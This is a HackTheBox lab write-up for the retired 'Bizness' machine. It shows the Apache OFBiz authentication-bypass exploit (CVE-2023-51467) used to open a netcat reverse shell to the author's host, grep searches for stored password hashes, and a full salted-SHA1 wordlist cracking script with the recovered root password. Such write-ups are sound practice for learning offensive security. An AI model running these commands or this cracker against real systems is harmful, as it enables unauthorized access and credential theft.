# Bizness
Attempting another easy retired box to get familiar/practice.

Metadata:
- OS: Linux
- Difficulty: Easy
- Status: Retired
- TARGET=10.10.11.252
- HOST=my IP

## Recon
Start off with an nmap scan.
`sudo nmap -p- -sC -sV $TARGET --open`

Results from initial nmap scan:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-20 15:37 CST
Nmap scan report for bizness.htb (10.10.11.252)
Host is up (0.061s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp   open  ssl/http   nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: BizNess Incorporated
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
46103/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.89 seconds
```

when I navigate to the site, I notice the request is rejected due to lack of domain name.
So I go to my `/etc/hosts` and add an entry for the target.
```

10.10.11.252 bizness.htb
```
Looks like another server with nginx. I might be able to use the same vulnerability as `Broker` to get the root flag.

### Dirbuster
Since I'm not sure what is available on this server. I ran `dirbuster`.

From the results I was able to find some directories such as `/accounting` that redirects me to here: `https://bizness.htb/accounting/control/main`

### SQL Injection?
I tried to use sqlmap against the form with no success. Trying some manual payloads also proved to be unsuccessful.

### [CVE-2023-51467](https://nvd.nist.gov/vuln/detail/CVE-2023-51467)
After doing some googling, I realized this box has a potential vulnerability with OFBiz.

I was able to confirm using this PoC: https://github.com/K3ysTr0K3R/CVE-2023-51467-EXPLOIT (thank you K3ysTr0K3R).

```
python CVE-2023-51467.py -u https://bizness.htb
  _______      ________    ___   ___ ___  ____        _____ __ _  _     ________
 / ____\ \    / /  ____|  |__ \ / _ \__ \|___ \      | ____/_ | || |   / /____  |
| |     \ \  / /| |__ ______ ) | | | | ) | __) |_____| |__  | | || |_ / /_   / /
| |      \ \/ / |  __|______/ /| | | |/ / |__ <______|___ \ | |__   _|  _ \ / /
| |____   \  /  | |____    / /_| |_| / /_ ___) |      ___) || |  | | | (_) / /
 \_____|   \/   |______|  |____|\___/____|____/      |____/ |_|  |_|  \___/_/

Coded By: K3ysTr0K3R

[+] https://bizness.htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y - is vulnerable to
CVE-2023-51467
```
So now that I have a major vulnerability, I need to set it up to execute a reverse shell.

## Getting onto the machine
After some testing, I realized I would need a java vulnerability to get an RCE. So I found another PoC that would actually let me execute a command. (Thank you jakabakos)

```bash
git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
cd Apache-OFBiz-Authentication-Bypass
python exploit.py --url https://bizness.htb --cmd 'nc -c bash $HOST 1337'

# second shell
ncat -lvnp 1337
```
### User flag
This makes getting a shell super easy. So no problem, `cat /home/ofbiz/user.txt`



## Privilege Escalation
Oh boy, this was another failed attempt at trying to find this without a hint. I attempted `linpeas.sh` again, but I couldn't see anything that stood out.

So after looking at another HTB, I realized they referenced a file named `AdminUserLoginData.xml` So I do my best to find it without looking.

```
#find /opt/ofbiz -iname "Admin*xml";

/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xmliname "Admin*xml"
/opt/ofbiz/framework/resources/templates/AdminNewTenantData-PostgreSQL.xml
/opt/ofbiz/framework/resources/templates/AdminNewTenantData-Oracle.xml
/opt/ofbiz/framework/resources/templates/AdminNewTenantData-Derby.xml
/opt/ofbiz/framework/resources/templates/AdminNewTenantData-MySQL.xml
```
I find the file and this is what is inside.

```
<?xml version="1.0" encoding="UTF-8"?>
<!--
Licensed to the Apache Software Foundation (ASF) under one
or more contributor license agreements.  See the NOTICE file
distributed with this work for additional information
regarding copyright ownership.  The ASF licenses this file
to you under the Apache License, Version 2.0 (the
"License"); you may not use this file except in compliance
with the License.  You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing,
software distributed under the License is distributed on an
"AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
KIND, either express or implied.  See the License for the
specific language governing permissions and limitations
under the License.
-->

<entity-engine-xml>
    <UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9aa
e0adec130880165d2cc05db1a" requirePasswordChange="Y"/>
```
Interesting, we know the format for the password. So I'm going to attempt my own hash crack.

### Trying to find the root password (encrypted)

```
grep -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}' . #get this grep from: https://techyrick.com/bizness-hackthebox-writeup/#privilege-escalation

#output
/c6850.dat:85:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Ypython-requests
./c5fa1.dat:4:PASSWORDSEPERATOR_LINESEPERATOR_TEXTSTATE_PROVINCE
./c180.dat:87:SYSCS_CREATE_USEuserNampasswordVARCHAR
./c180.dat:87:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
./c180.dat:87:SYSCS_RESET_PASSWORuserNampasswordVARCHAR
./c180.dat:87:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
./c180.dat:87:SYSCS_MODIFY_PASSWORpasswordVARCHAR
./c54d0.dat:21:Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled
```
another version of grep gives me the full line
```
./c54d0.dat:21:Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 0
3:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
```

`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I` here is the password! UPDATE: realized I was missing a trailing `=`. Why it took forever for my crack to work. unsure why the trailing `=` isn't in the output. Something to learn in the future.




Now, can I crack the password? If I can, then I can easily get the root flag.
### Cracking the salted password

At this point, I looked up a script for cracking the password. Unfortunate, but I'll work on it. Thanks [Aayushpantha](https://medium.com/@aayushpantha97/bizness-walkthrough-hackthebox-d75eab167006)

```python
import hashlib
import base64
import os
from tqdm import tqdm

class PasswordEncryptor:
    def __init__(self, hash_type="SHA", pbkdf2_iterations=10000):
        """
        Initialize the PasswordEncryptor object with a hash type and PBKDF2 iterations.

        :param hash_type: The hash algorithm to use (default is SHA).
        :param pbkdf2_iterations: The number of iterations for PBKDF2 (default is 10000).
        """
        self.hash_type = hash_type
        self.pbkdf2_iterations = pbkdf2_iterations

    def crypt_bytes(self, salt, value):
        """
        Crypt a password using the specified hash type and salt.

        :param salt: The salt used in the encryption.
        :param value: The password value to be encrypted.
        :return: The encrypted password string.
        """
        if not salt:
            salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
        hash_obj = hashlib.new(self.hash_type)
        hash_obj.update(salt.encode('utf-8'))
        hash_obj.update(value)
        hashed_bytes = hash_obj.digest()
        result = f"${self.hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"
        return result

    def get_crypted_bytes(self, salt, value):
        """
        Get the encrypted bytes for a password.

        :param salt: The salt used in the encryption.
        :param value: The password value to get encrypted bytes for.
        :return: The encrypted bytes as a string.
        """
        try:
            hash_obj = hashlib.new(self.hash_type)
            hash_obj.update(salt.encode('utf-8'))
            hash_obj.update(value)
            hashed_bytes = hash_obj.digest()
            return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')
        except hashlib.NoSuchAlgorithmException as e:
            raise Exception(f"Error while computing hash of type {self.hash_type}: {e}")

# Example usage:
hash_type = "SHA1"
salt = "d"
search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="
wordlist = '/usr/wordlist/rockyou.txt'

# Create an instance of the PasswordEncryptor class
encryptor = PasswordEncryptor(hash_type)

# Get the number of lines in the wordlist for the loading bar
total_lines = sum(1 for _ in open(wordlist, 'r', encoding='latin-1'))

# Iterate through the wordlist with a loading bar and check for a matching password
with open(wordlist, 'r', encoding='latin-1') as password_list:
    for password in tqdm(password_list, total=total_lines, desc="Processing"):
        value = password.strip()

        # Get the encrypted password
        hashed_password = encryptor.crypt_bytes(salt, value.encode('utf-8'))

        # Compare with the search hash
        if hashed_password == search:
            print(f'Found Password:{value}, hash:{hashed_password}')
            break  # Stop the loop if a match is found
```

### Root flag
Now that I have the script, just need to run it and get the password.
```

python crack_bizness.py
Processing:  10%|█████▋| 1445970/14344392 [00:01<00:15, 850908.55it/s]
Found Password:monkeybizness, hash:$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=
```

then I go back to my user terminal and run `su -` and type in the password: `monkeybizness`
`cat /root/root.txt` - GG


## Final Thoughts
This box wasn't necessarily too hard once I figured out what was running. I think having a familiarity with `dirbuster` and finding the admin page wasn't hard.

Once you know what is running and you can find a CVE, getting onto the box isn't "too hard". However, once again I was stumped on how to escalate.

My takeaway from this challenge is I learned how one might find the salted password written. I plan to take that code and turn it into a utility. Might be useful in the future.

As always, thank you to the write-ups/PoCs listed. I couldn't have done it without you. Overtime, I hope to stay up-to-date solving boxes before there are write-ups.
